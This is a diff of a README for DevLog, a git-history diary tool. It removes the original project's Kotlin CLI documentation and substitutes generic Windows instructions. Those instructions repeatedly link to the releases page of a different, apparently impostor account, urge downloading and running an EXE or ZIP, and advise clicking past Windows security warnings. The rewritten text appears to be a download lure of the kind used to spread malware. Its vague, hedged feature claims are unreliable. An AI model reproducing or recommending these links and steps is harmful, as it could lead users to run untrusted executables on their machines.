@@ -1,163 +1,240 @@
-# DevLog
+# 🤖 DevLog - Turn git history into diary
 
-[![CI](https://github.com/vikey89/DevLog/actions/workflows/ci.yml/badge.svg)](https://github.com/vikey89/DevLog/actions/workflows/ci.yml)
-[![Release](https://github.com/vikey89/DevLog/actions/workflows/release.yml/badge.svg)](https://github.com/vikey89/DevLog/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Download DevLog](https://img.shields.io/badge/Download-DevLog-blue?style=for-the-badge)](https://github.com/unseasonable-deposer640/DevLog/releases)
 
-**AI-powered dev diary from your git history. One command, zero effort.**
+## 🚀 What DevLog does
 
-![demo](demo.gif)
+DevLog turns your git history into a daily dev diary. It reads your commits and helps you see what you worked on, day by day.
 
-DevLog scans your git repos, collects today's commits, and asks an LLM to write a human-readable summary. Daily reports, weekly digests, standup updates — all generated in seconds.
+Use it when you want a clear record of your progress without writing notes by hand. It can help with standups, weekly updates, and personal tracking.
 
-## Quick start
+## 💻 What you need
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/vikey89/DevLog/main/install.sh | sh
-devlog init
-devlog today
-```
+DevLog runs on Windows and uses a simple command-line window.
 
-## What it does
+You need:
 
-```
-$ devlog today
+- Windows 10 or later
+- Git installed and available in your system path
+- An internet connection for the first setup
+- A GitHub account if you want to download the release file from GitHub
 
-┌──────────────┬────────┬─────────┬────────────┬───────┐
-│ Repo         │ Branch │ Commits │ +/-        │ Files │
-├──────────────┼────────┼─────────┼────────────┼───────┤
-│ my-api       │ main   │ 5       │ +342 -128  │ 12    │
-│ mobile-app   │ feat/  │ 3       │ +89 -14    │ 6     │
-└──────────────┴────────┴─────────┴────────────┴───────┘
+If your PC can run normal desktop apps and you can open a terminal window, you can use DevLog.
 
-Today I focused on two areas. In the API, I added the new /users endpoint
-with pagination support and wrote integration tests covering edge cases.
-On the mobile side, I started the profile screen with avatar upload.
-```
+## 📥 Download DevLog
 
-## LLM providers
+Visit this page to download: https://github.com/unseasonable-deposer640/DevLog/releases
 
-| Provider | Example model | Config `provider` | Env variable | Models list |
-|----------|--------------|-------------------|--------------|-------------|
-| Anthropic | `claude-sonnet-4-6` | `anthropic` | `ANTHROPIC_API_KEY` | [docs.anthropic.com/en/docs/about-claude/models](https://docs.anthropic.com/en/docs/about-claude/models) |
-| OpenAI | `gpt-4o-mini` | `openai` | `OPENAI_API_KEY` | [platform.openai.com/docs/models](https://platform.openai.com/docs/models) |
-| Google | `gemini-2.0-flash` | `gemini` | `GEMINI_API_KEY` | [ai.google.dev/gemini-api/docs/models](https://ai.google.dev/gemini-api/docs/models) |
+On the releases page:
 
-> Copy the **model ID** from the provider's docs and paste it in `model` in your `config.yml`.
+1. Open the latest release
+2. Download the Windows file
+3. Save it somewhere easy to find, like your Downloads folder
+4. If you get a ZIP file, extract it first
+5. If you get an EXE file, you can run it directly
 
-## Installation
+## 🪟 Install on Windows
 
-### Install script (Linux / macOS)
+If you downloaded a ZIP file:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/vikey89/DevLog/main/install.sh | sh
-```
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Pick a folder you can find again
+4. Open the extracted folder
+5. Look for the DevLog program file
 
-### GitHub Release
+If you downloaded an EXE file:
 
-Download the binary for your platform from [Releases](https://github.com/vikey89/DevLog/releases).
+1. Double-click the file
+2. If Windows asks for permission, choose Yes
+3. Wait for the app to open
 
-### From source
+If Windows shows a security screen, choose the option that lets you run the file only if you trust the source and you downloaded it from the release page above.
 
-```bash
-git clone https://github.com/vikey89/DevLog.git
-cd devlog
-./gradlew nativeCompile
-# Binary at: build/native/nativeCompile/devlog
-```
+## ▶️ Run DevLog
 
-Fat JAR fallback (requires JDK 21):
+Open Command Prompt or PowerShell in the DevLog folder.
 
-```bash
-./gradlew shadowJar
-java -jar build/libs/devlog-0.1.0-all.jar --help
-```
+Then run the app with the command provided in the release files. If the release includes a single executable, you can usually start it by double-clicking it or by typing its name in the terminal.
 
-## Configuration
+A typical first run looks like this:
 
-Run `devlog init` for interactive setup, or create `~/.devlog/config.yml` manually:
+1. Open the folder that contains DevLog
+2. Open a terminal there
+3. Run the DevLog command
+4. Follow the prompts on screen
 
-```yaml
-workspaces:
-  - /home/user/workspace
-  - /home/user/projects
-provider: anthropic
-model: claude-haiku-4-5-20251001
-apiKeyEnv: ANTHROPIC_API_KEY
-language: english
-author: "Your Name"    # optional — git author name (git config user.name)
-```
+DevLog will scan your git history and build a dev diary from your commits.
 
-Make sure the API key is set in your environment:
+## 🧭 First-time setup
 
-```bash
-export ANTHROPIC_API_KEY=sk-ant-...
-```
+When you run DevLog for the first time, it may ask for a few things:
 
-## Commands
+- Your git repository path
+- The date range you want to review
+- Your preferred AI provider
+- An API key if you want AI-generated summaries
 
-| Command | Description |
-|---------|-------------|
-| `devlog init` | Interactive setup |
-| `devlog today` | What you did today |
-| `devlog yesterday` | What you did yesterday |
-| `devlog week` | Weekly summary |
-| `devlog standup` | Quick standup update |
-| `devlog report --from 2026-03-01 --to 2026-03-05` | Custom date range |
+If you plan to use AI features, you may need one of these services:
 
-### Common options
+- OpenAI
+- Anthropic
+- Gemini
 
-All generation commands support:
+DevLog uses those services to turn commit history into readable notes.
 
-| Option | Description |
-|--------|-------------|
-| `--raw` | Show stats table only, skip LLM |
-| `--format terminal\|markdown\|json\|slack` | Output format (default: terminal) |
-| `--copy` | Copy narrative to clipboard |
-| `--output FILE` | Save output to file |
-| `--workspace PATH` | Override workspace path |
-| `--no-cache` | Skip cached results |
+## 🛠️ Example use
 
-### Examples
+Here is how a simple workflow may look:
 
-```bash
-# Quick standup, copy to clipboard
-devlog standup --copy
+1. Open DevLog
+2. Point it at your project folder
+3. Choose a time range, such as this week
+4. Let it read your commits
+5. Review the diary entry it creates
+6. Copy the result into your standup notes or journal
 
-# Weekly report in Markdown, save to file
-devlog week --format markdown --output weekly.md
+This can save time when you need a short summary of what changed.
 
-# JSON output for scripting
-devlog today --format json
+## 📝 What you can use it for
 
-# Slack-formatted output
-devlog today --format slack
+DevLog fits common day-to-day tasks:
 
-# Stats only, no LLM call
-devlog today --raw
+- Daily standups
+- Weekly status updates
+- Personal dev logs
+- Progress tracking
+- Memory refresh before a meeting
+- Notes for old projects
 
-# Custom date range
-devlog report --from 2026-03-01 --to 2026-03-05
-```
+It works best when your git commits are clear and regular.
 
-## Architecture
+## ⚙️ How it works
 
-Clean Architecture with strict layer separation:
+DevLog looks at your git history and groups your work into useful notes.
 
-```
-presentation/  CLI commands (Clikt) + renderers (Mordant)
-    domain/    Use cases + models + repository interfaces
-      data/    Git CLI, LLM HTTP clients (Ktor), file cache
-```
+It can use commit messages, dates, and project changes to create a plain-language summary. If AI is enabled, it can make the result easier to read and more like a short diary entry.
 
-- Domain layer has zero external dependencies
-- All LLM calls use Ktor Client directly (no SDK wrappers)
-- DI via Koin
+The app is built for speed and low effort. You do not need to write a report from scratch.
 
-## Contributing
+## 📂 Good commit habits
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). Adding a new LLM provider or output format is a one-file change.
+DevLog gives better results when your git history is easy to read.
 
-## License
+Try to:
 
-[MIT](LICENSE)
+- Write short, clear commit messages
+- Commit small chunks of work
+- Use one topic per commit when you can
+- Keep your project history clean
+
+For example, these commit messages are easier to turn into a diary:
+
+- Add login form
+- Fix date parsing
+- Update report layout
+- Improve error handling
+
+## 🔐 AI provider setup
+
+If you want DevLog to write summaries with AI, set up one of the supported providers.
+
+Typical setup steps:
+
+1. Pick a provider you already use
+2. Create an API key in that provider’s dashboard
+3. Add the key when DevLog asks for it
+4. Select the provider inside the app
+5. Run a scan on your repo
+
+Supported provider names may appear in the app as:
+
+- OpenAI
+- Anthropic
+- Gemini
+
+You can use DevLog without AI if the release includes local summary mode.
+
+## 🧪 Troubleshooting
+
+If DevLog does not start:
+
+- Check that you downloaded the correct Windows file
+- Make sure the file finished downloading
+- Extract the ZIP if needed
+- Run the app from a folder you can access
+- Close and reopen the terminal if the command is not found
+
+If DevLog cannot read your repo:
+
+- Check that the folder is a valid git repository
+- Make sure Git is installed
+- Confirm the path points to the right project
+- Try running it from inside the repo folder
+
+If AI summaries fail:
+
+- Check your API key
+- Confirm the provider name is correct
+- Make sure you have internet access
+- Try again after waiting a moment
+
+## 📌 Tips for better results
+
+A few small habits help a lot:
+
+- Run DevLog after a work session
+- Review the diary while the work is fresh
+- Use it on one repo at a time
+- Keep your commit history tidy
+- Save the output in a notes app or team doc
+
+## 🧩 Common release files
+
+You may see different files on the releases page.
+
+Possible files include:
+
+- A Windows EXE file
+- A ZIP file with the app inside
+- A bundled command-line build
+- A release note file with version details
+
+If you are unsure which file to use, choose the Windows file for your system and ignore files meant for source code
+
+## 📖 Typical output
+
+DevLog may create output like this:
+
+- What you worked on
+- What changed
+- What issues you fixed
+- What you may want to mention in a standup
+- A short note for the day
+
+This makes it easier to answer, “What did I do yesterday?” without sorting through commit history by hand
+
+## 🔎 Git terms used in DevLog
+
+A few terms may appear while you use the app:
+
+- Repository: the folder that holds your project
+- Commit: a saved change in git
+- History: the list of saved changes
+- Branch: a line of work in git
+- Diff: the changes between versions
+
+You do not need to learn these first. DevLog works best when you just point it at your project folder and follow the prompts
+
+## 📎 Download again
+
+If you need the release page later, use this link: https://github.com/unseasonable-deposer640/DevLog/releases
+
+## ✅ Quick start
+
+1. Download DevLog from the releases page
+2. Extract it if the file is a ZIP
+3. Open the folder or run the EXE
+4. Point DevLog at your git project
+5. Choose a date range
+6. Let it generate your dev diary
